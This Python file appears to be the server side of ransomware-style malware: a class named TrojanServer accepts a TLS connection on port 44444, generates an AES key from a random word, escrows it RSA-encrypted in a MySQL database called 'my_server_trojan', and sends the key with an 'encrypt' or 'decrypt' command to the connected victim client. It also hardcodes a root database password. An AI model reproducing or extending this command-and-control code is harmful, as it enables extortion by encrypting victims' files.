import os
import socket
import ssl
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
import base64
from random_word import RandomWords
import protocol

class  TrojanServer:
    def __init__(self, host, port, cert_file, key_file):
        self.host = host
        self.port = port
        self.cert_path = cert_file
        self.key_path = key_file
        self.context = self._create_ssl_context()
    
    def _create_ssl_context(self):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.cert_path, keyfile=self.key_path)
        return context
    
    def start(self, action):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.host, self.port))
            s.listen(1)
            with self.context.wrap_socket(s, server_side=True) as secure_sock:
                conn, address = secure_sock.accept()
                with conn:
                    print(f"Connection from {address} secured with TLS")
                    self.handle_client(conn, action)

    def handle_client(self, conn, action):
        if action == "encrypt":
            aes_key = self.GENERATE_AES_KEY(conn)
        else:
            aes_key = self.GET_AES_KEY(conn)
        
        protocol.send(conn, aes_key)
        protocol.send(conn, action)
        
        response = protocol.receive(conn).decode()
        print(response)

    
    # פונקציות עזר הקשורות ל-DB ו-RSA/AES
    def generate_aes_key_from_secret_word(self, secret_word):
        hasher = SHA256.new()
        hasher.update(secret_word.encode())
        return hasher.digest()
    
    def GENERATE_AES_KEY(self, conn):
        r = RandomWords()
        random_word = r.get_random_word()
        aes_key = self.generate_aes_key_from_secret_word(random_word)
        encrypted_key = self.encrypt_aes_key_with_rsa(aes_key)
        self.save_encrypted_key_to_db(encrypted_key)
        return aes_key
    
    def GET_AES_KEY(self, conn):
        encrypted_key = self.mysql_retrieve_last_key()
        aes_key = self.decrypt_RSA_from_AES_key(encrypted_key)
        return aes_key


    def encrypt_aes_key_with_rsa(self, aes_key):
        with open("server_RSA_public.pem", "rb") as f:
            public_key = RSA.import_key(f.read())
        cipher = PKCS1_OAEP.new(public_key)
        encrypted = cipher.encrypt(aes_key)
        return base64.b64encode(encrypted).decode()

    def decrypt_RSA_from_AES_key(self, enc_key):
        with open("server_RSA_private.pem", "rb") as f:
            private_key = RSA.import_key(f.read())
        cipher = PKCS1_OAEP.new(private_key)
        encrypted_bytes = base64.b64decode(enc_key)
        return cipher.decrypt(encrypted_bytes)

    def save_encrypted_key_to_db(self, key_b64):
        conn = mysql.connector.connect(
            host="localhost", user="root", password="Galking22!!!", database="my_server_trojan"
        )
        cursor = conn.cursor()
        cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (key_b64,))
        conn.commit()
        cursor.close()
        conn.close()

    def mysql_retrieve_last_key(self):
        conn = mysql.connector.connect(
            host="localhost", user="root", password="Galking22!!!", database="my_server_trojan"
        )
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        return result[0] if result else None


if __name__ == "__main__":
    action = "encrypt"  # "encrypt or "decrypt" - set this manually
    
    server = TrojanServer("0.0.0.0", 44444, "path/to/cert.pem", "path/to/key.pem")
    server.start(action)